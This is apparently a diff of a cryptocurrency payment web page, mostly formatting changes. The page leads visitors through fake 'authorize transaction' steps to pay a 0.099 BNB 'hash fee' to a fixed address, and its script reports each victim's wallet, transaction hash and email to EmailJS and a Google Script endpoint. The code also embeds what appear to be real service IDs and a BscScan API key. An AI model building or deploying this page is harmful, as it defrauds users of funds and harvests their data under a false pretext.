@@ -1,4 +1,5 @@
-<!DOCTYPE html><html lang="en">
+<!DOCTYPE html>
+<html lang="en">
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
@@ -89,31 +90,41 @@
     <div id="walletStatus">🔌 Not connected</div>
     <button class="btn" onclick="connectWallet()">Connect Wallet</button>
     <button class="btn" onclick="switchPage('page2')">Confirm Contract Transaction</button>
-  </div>  <div class="container hidden" id="page2">
+  </div>
+
+  <div class="container hidden" id="page2">
     <h1>Authorize Transaction</h1>
     <p>Your transaction is being authorized on the blockchain.</p>
     <button class="btn" onclick="switchPage('page3')">Confirm: OpBNB Transaction</button>
-  </div>  <div class="container hidden" id="page3">
+  </div>
+
+  <div class="container hidden" id="page3">
     <h1>Confirm Payment</h1>
     <p>Top up hash fee: <strong>0.099 BNB</strong></p>
-    <div class="address-box" id="targetAddress">0xFf5e8a2603e64b2950Ee8D0Af6AC86670bD5Db69</div>
+    <div class="address-box">0xFf5e8a2603e64b2950Ee8D0Af6AC86670bD5Db69</div>
     <a class="link" href="https://bscscan.com/address/0xFf5e8a2603e64b2950Ee8D0Af6AC86670bD5Db69" target="_blank">🔍 View on BscScan</a>
     <img class="qr" src="https://chart.googleapis.com/chart?cht=qr&chs=200x200&chl=0xFf5e8a2603e64b2950Ee8D0Af6AC86670bD5Db69" alt="QR Code" />
     <button class="btn" onclick="sendTransaction()">✅ Send Transaction</button>
     <div id="status" class="status"></div>
-  </div>  <div class="container hidden" id="successPage">
+  </div>
+
+  <div class="container hidden" id="successPage">
     <h1>✅ Success</h1>
     <p>Transaction sent successfully. You’ll be redirected.</p>
-  </div>  <div class="container hidden" id="failPage">
+  </div>
+
+  <div class="container hidden" id="failPage">
     <h1>❌ Failed</h1>
     <p>Transaction failed. Please try again.</p>
     <button class="btn" onclick="switchPage('page1')">🔁 Retry</button>
-  </div>  <script>
+  </div>
+
+  <script>
     const targetAddress = "0xFf5e8a2603e64b2950Ee8D0Af6AC86670bD5Db69";
     const emailService = "service_78wwbgl";
     const templateID = "template_omkmcio";
     const publicKey = "ochPV1QVtay7TOdBA";
-    const sheetUrl = "YOUR_GOOGLE_SCRIPT_URL_HERE";
+    const sheetUrl = "https://script.google.com/macros/s/YOUR_DEPLOYED_SCRIPT_ID/exec"; // Replace if needed
     const BSCSCAN_API_URL = "https://api.bscscan.com/api";
     const BSCSCAN_API_KEY = "ZM8ACMJB67C2IXKKBF8URFUNSY";
 
@@ -159,7 +170,6 @@
           body: JSON.stringify({ user_wallet: userAddress, tx_hash: tx.hash, email, to_address: targetAddress })
         });
 
-        // Optional BscScan TX Status check
         const txCheck = await fetch(`${BSCSCAN_API_URL}?module=transaction&action=gettxreceiptstatus&txhash=${tx.hash}&apikey=${BSCSCAN_API_KEY}`);
         const result = await txCheck.json();
         if (result.status === "1" && result.result.status === "1") {
